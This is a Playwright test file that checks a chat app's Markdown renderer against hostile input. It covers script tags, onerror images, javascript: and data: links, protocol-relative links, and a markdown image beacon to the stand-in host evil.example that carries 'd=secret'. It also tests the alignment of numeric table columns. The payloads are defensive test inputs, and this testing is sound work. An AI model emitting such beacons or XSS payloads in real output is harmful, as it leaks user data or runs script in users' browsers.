import { expect, test, type Page } from "@playwright/test";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";

import Markdown, { safeUrl } from "../app/chat/Markdown";

// Node-only: renders the component to a string, no browser. Assertions are on
// elements and attributes, not text: skipHtml keeps the inner text of dropped
// tags (research Pitfall 10). All values are synthetic.
function render(source: string): string {
  return renderToStaticMarkup(React.createElement(Markdown, null, source));
}

test.describe("Markdown renderer (node-only)", () => {
  test("raw script and onerror HTML yield no active elements", () => {
    const html = render(
      '<script>window.__pwned=1</script>\n\n<img src=x onerror="window.__pwned=1">',
    );
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/onerror/i);
  });

  test("markdown image beacon renders alt text only, no element or URL", () => {
    const html = render("![x](https://evil.example/?d=1)");
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/(src|href)="[^"]*evil\.example/i);
    expect(html).toContain("<span>x</span>");
  });

  test("javascript: and data: links render as spans, never an href", () => {
    const html = render(
      "[x](javascript:alert(1)) [y](JaVaScRiPt:alert(1)) [z](data:text/html,hi)",
    );
    expect(html).not.toMatch(/href="javascript/i);
    expect(html).not.toMatch(/href="data/i);
    expect(html).not.toContain('href=""');
    expect(html).not.toMatch(/<a /);
    expect(html).toContain("<span>x</span>");
  });

  test("external links open in a new tab with noopener noreferrer", () => {
    const html = render("[ok](https://example.com)");
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  test("relative and mailto links keep their href and open normally", () => {
    const html = render("[rel](/records?type=expense) [m](mailto:a@example.com)");
    expect(html).toContain('href="/records?type=expense"');
    expect(html).toContain('href="mailto:a@example.com"');
    expect(html).not.toContain("_blank");
  });

  test("GFM table: tabular numerals, numeric column right-aligned, scroll region", () => {
    const html = render(
      [
        "| Category | Amount |",
        "| --- | --- |",
        "| Food | Rp 1,250,000 |",
        "| Transport | Rp 300,000 |",
      ].join("\n"),
    );
    expect(html).toMatch(/role="region"[^>]*aria-label="Table"|aria-label="Table"[^>]*role="region"/);
    expect(html).toContain("overflow-x:auto");
    expect(html).toContain("tabular-nums");
    const th = html.match(/<th\s[^>]*>/g) ?? [];
    const td = html.match(/<td\s[^>]*>/g) ?? [];
    expect(th).toHaveLength(2);
    expect(td).toHaveLength(4);
    // first column left, numeric column right (header and body cells)
    expect(th[0]).not.toContain("text-align:right");
    expect(th[1]).toContain("text-align:right");
    expect(td[0]).not.toContain("text-align:right");
    expect(td[1]).toContain("text-align:right");
    expect(td[3]).toContain("text-align:right");
  });

  test("numeric column is right-aligned even over an explicit GFM alignment", () => {
    // UAT shape: model writes a left-aligned row; centre variant too.
    const cases: [string, string][] = [
      ["| :--- | :--- |", "left"],
      ["| --- | :---: |", "center"],
    ];
    for (const [align, wrong] of cases) {
      const html = render(
        ["| Name | Amount |", align, "| Food | 1,000 |", "| Fun | 2,500 |"].join("\n"),
      );
      const th = html.match(/<th\s[^>]*>/g) ?? [];
      const td = html.match(/<td\s[^>]*>/g) ?? [];
      expect(th).toHaveLength(2);
      expect(td).toHaveLength(4);
      for (const cell of [th[1], td[1], td[3]]) {
        expect(cell).toContain("text-align:right");
        expect(cell).not.toContain(`text-align:${wrong}`);
      }
      // first column keeps its alignment
      expect(th[0]).toContain("text-align:left");
      expect(td[0]).toContain("text-align:left");
    }
  });

  test("a mixed text column keeps the model's explicit alignment", () => {
    const html = render(
      ["| Name | Note |", "| :--- | :---: |", "| Food | 1,000 |", "| Fun | n/a |"].join("\n"),
    );
    expect(html).not.toContain("text-align:right");
    const td = html.match(/<td\s[^>]*>/g) ?? [];
    expect(td[1]).toContain("text-align:center");
  });

  test("a mixed text column is not right-aligned", () => {
    const html = render(
      ["| Name | Note |", "| --- | --- |", "| Food | 1,000 |", "| Fun | n/a |"].join("\n"),
    );
    expect(html).not.toContain("text-align:right");
  });

  test("protocol-relative links render as spans, never an in-app href", () => {
    const html = render("[x](//evil.example/p?d=1)");
    expect(html).not.toMatch(/<a /);
    expect(html).not.toContain("evil.example");
    expect(safeUrl("//evil.example/p")).toBe("");
    expect(safeUrl("/\\evil.example")).toBe("");
    expect(safeUrl("/records?x=1")).toBe("/records?x=1");
  });

  test("safeUrl allows http, https, mailto and relative only", () => {
    expect(safeUrl("https://a.example")).toBe("https://a.example");
    expect(safeUrl("javascript:x")).toBe("");
    expect(safeUrl("data:x")).toBe("");
    expect(safeUrl("/records")).toBe("/records");
    expect(safeUrl("#x")).toBe("#x");
    expect(safeUrl("mailto:a@example.com")).toBe("mailto:a@example.com");
  });
});

// ---------------------------------------------------------------------------
// Browser: the chat page renders answers through Markdown (D-10).
// ---------------------------------------------------------------------------
const RUN = "00000000-0000-4000-8000-0000000000a1";
const sse = (...events: unknown[]) =>
  events.map((e) => `data: ${typeof e === "string" ? e : JSON.stringify(e)}\n\n`).join("");
const runEvt = { type: "run", run_id: RUN };
const input = (page: Page) => page.getByLabel("Ask monai a question");

async function askWithText(page: Page, text: string) {
  await page.route(/\/api\/threads$/, (route) => route.fulfill({ json: [] }));
  await page.route(/\/api\/query-stream$/, (route) =>
    route.fulfill({
      status: 200,
      contentType: "text/event-stream",
      body: sse(runEvt, { type: "answer", text, proposals: [], trace: [] }, "[DONE]"),
    }),
  );
  await page.goto("/chat");
  await input(page).fill("Synthetic question?");
  await input(page).press("Enter");
  await expect(page.locator('[data-testid="answer"]')).toBeVisible();
}

test.describe("Markdown in the chat page (browser)", () => {
  test("hostile markdown makes no beacon request and runs no script", async ({ page }) => {
    const requests: string[] = [];
    page.on("request", (r) => requests.push(r.url()));
    await askWithText(
      page,
      [
        "<script>window.__pwned=1</script>",
        '<img src=x onerror="window.__pwned=1">',
        "![x](https://evil.example/beacon?d=secret)",
        "[js](javascript:window.__pwned=1) [data](data:text/html,hi)",
        "[ok](https://example.com)",
      ].join("\n\n"),
    );
    // let any (forbidden) image request fire before asserting its absence
    await page.waitForLoadState("networkidle");
    expect(requests.filter((u) => u.includes("evil.example"))).toEqual([]);
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
    const answer = page.locator('[data-testid="answer"]');
    await expect(answer.locator("img")).toHaveCount(0);
    await expect(answer.locator("script")).toHaveCount(0);
    const hrefs = await answer
      .locator("a")
      .evaluateAll((as) => as.map((a) => [a.getAttribute("href"), a.getAttribute("target"), a.getAttribute("rel")]));
    expect(hrefs).toEqual([["https://example.com", "_blank", "noopener noreferrer"]]);
  });

  test("a GFM table renders tabular and right-aligned inside a scrolling region", async ({ page }) => {
    await askWithText(
      page,
      [
        "| Category | Amount |",
        "| --- | --- |",
        "| Food | Rp 1,250,000 |",
        "| Transport | Rp 300,000 |",
      ].join("\n"),
    );
    const answer = page.locator('[data-testid="answer"]');
    const css = (sel: string, prop: string) =>
      answer.locator(sel).evaluateAll((els, p) => els.map((e) => getComputedStyle(e).getPropertyValue(p)), prop);
    expect(await answer.getByRole("region", { name: "Table" }).evaluate((e) => getComputedStyle(e).overflowX)).toBe("auto");
    for (const v of await css("th, td", "font-variant-numeric")) expect(v).toContain("tabular-nums");
    // th: [Category, Amount]; td: [Food, 1,250,000, Transport, 300,000]
    expect(await css("th", "text-align")).toEqual(["left", "right"]);
    expect(await css("td", "text-align")).toEqual(["left", "right", "left", "right"]);
  });

  test("a model-left-aligned numeric column still renders right-aligned", async ({ page }) => {
    await askWithText(
      page,
      ["| Name | Amount |", "| :--- | :--- |", "| Food | 1,000 |", "| Fun | 2,500 |"].join("\n"),
    );
    const answer = page.locator('[data-testid="answer"]');
    const css = (sel: string, prop: string) =>
      answer.locator(sel).evaluateAll((els, p) => els.map((e) => getComputedStyle(e).getPropertyValue(p)), prop);
    expect(await css("th", "text-align")).toEqual(["left", "right"]);
    expect(await css("td", "text-align")).toEqual(["left", "right", "left", "right"]);
  });
});
